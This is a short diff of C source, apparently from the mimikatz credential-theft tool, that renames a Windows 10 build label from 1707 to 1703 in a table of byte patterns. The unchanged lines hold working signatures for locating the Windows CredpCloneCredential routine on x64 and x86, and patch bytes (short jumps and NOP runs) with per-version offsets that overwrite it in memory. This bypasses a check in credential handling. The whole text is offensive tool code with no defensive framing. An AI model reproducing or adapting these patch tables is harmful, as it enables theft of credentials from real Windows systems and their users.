@@ -375,7 +375,7 @@ BYTE PTRN_WN60_CredpCloneCredential[]			= {0x44, 0x8b, 0xea, 0x41, 0x83, 0xe5, 0
 BYTE PTRN_WN62_CredpCloneCredential[]			= {0x44, 0x8b, 0xfa, 0x41, 0x83, 0xe7, 0x01, 0x75};
 BYTE PTRN_WN63_CredpCloneCredential[]			= {0x45, 0x8b, 0xf8, 0x44, 0x23, 0xfa};
 BYTE PTRN_WN10_1607_CredpCloneCredential[]		= {0x45, 0x8b, 0xe0, 0x41, 0x83, 0xe4, 0x01, 0x75};
-BYTE PTRN_WN10_1707_CredpCloneCredential[]		= {0x45, 0x8b, 0xe6, 0x41, 0x83, 0xe4, 0x01, 0x75};
+BYTE PTRN_WN10_1703_CredpCloneCredential[]		= {0x45, 0x8b, 0xe6, 0x41, 0x83, 0xe4, 0x01, 0x75};
 BYTE PATC_WNT5_CredpCloneCredentialJmpShort[]	= {0x90, 0xe9};
 BYTE PATC_WALL_CredpCloneCredentialJmpShort[]	= {0xeb};
 BYTE PATC_WN64_CredpCloneCredentialJmpShort[]	= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
@@ -386,21 +386,21 @@ KULL_M_PATCH_GENERIC CredpCloneCredentialReferences[] = {
 	{KULL_M_WIN_BUILD_BLUE,	{sizeof(PTRN_WN63_CredpCloneCredential),	PTRN_WN63_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{6}},
 	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN63_CredpCloneCredential),	PTRN_WN63_CredpCloneCredential},	{sizeof(PATC_WN64_CredpCloneCredentialJmpShort),	PATC_WN64_CredpCloneCredentialJmpShort},	{6}},
 	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WN10_1607_CredpCloneCredential),	PTRN_WN10_1607_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
-	{KULL_M_WIN_BUILD_10_1707,	{sizeof(PTRN_WN10_1707_CredpCloneCredential),	PTRN_WN10_1707_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
+	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN10_1703_CredpCloneCredential),	PTRN_WN10_1703_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
 };
 #elif defined _M_IX86
 BYTE PTRN_WNT5_CredpCloneCredential[]			= {0x8b, 0x43, 0x04, 0x83, 0xf8, 0x01, 0x74};
 BYTE PTRN_WN60_CredpCloneCredential[]			= {0x89, 0x4d, 0x18, 0x83, 0x65, 0x18, 0x01, 0x75};
 BYTE PTRN_WN62_CredpCloneCredential[]			= {0x75, 0x1e, 0x83, 0x7f, 0x04, 0x02, 0x0f, 0x84};
 BYTE PTRN_WN64_CredpCloneCredential[]			= {0x75, 0x17, 0x83, 0x7f, 0x04, 0x02, 0x74};
-BYTE PTRN_WN10_1707_CredpCloneCredential[]		= {0x75, 0x1e, 0x8b, 0x47, 0x04, 0x83, 0xf8, 0x02, 0x0f, 0x84};
+BYTE PTRN_WN10_1703_CredpCloneCredential[]		= {0x75, 0x1e, 0x8b, 0x47, 0x04, 0x83, 0xf8, 0x02, 0x0f, 0x84};
 BYTE PATC_WALL_CredpCloneCredentialJmpShort[]	= {0xeb};
 KULL_M_PATCH_GENERIC CredpCloneCredentialReferences[] = {
 	{KULL_M_WIN_BUILD_XP,	{sizeof(PTRN_WNT5_CredpCloneCredential),	PTRN_WNT5_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{6}},
 	{KULL_M_WIN_BUILD_VISTA,{sizeof(PTRN_WN60_CredpCloneCredential),	PTRN_WN60_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
 	{KULL_M_WIN_BUILD_8,	{sizeof(PTRN_WN62_CredpCloneCredential),	PTRN_WN62_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{0}},
 	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN64_CredpCloneCredential),	PTRN_WN64_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{0}},
-	{KULL_M_WIN_BUILD_10_1707,	{sizeof(PTRN_WN10_1707_CredpCloneCredential),	PTRN_WN10_1707_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{0}},
+	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN10_1703_CredpCloneCredential),	PTRN_WN10_1703_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{0}},
 };
 #endif
 
